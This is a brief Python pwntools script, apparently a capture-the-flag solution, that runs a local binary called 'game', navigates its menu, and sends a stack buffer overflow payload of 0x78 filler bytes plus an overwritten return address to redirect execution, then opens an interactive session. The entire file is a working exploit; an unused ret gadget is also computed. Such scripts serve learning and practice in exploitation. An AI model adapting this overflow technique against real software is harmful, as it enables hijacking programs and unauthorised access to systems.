from pwn import *

p = process('./game')

p.recvuntil(b'program')
p.sendline(b'1')
p.recvuntil(b':\n')

address = 0x401624
offset = b'A' * (0x78)

elf = ELF('./game')
rop = ROP(elf)
ret = p64(rop.find_gadget(['ret'])[0])

payload = offset + p64(address)

p.sendline(payload)
p.interactive()

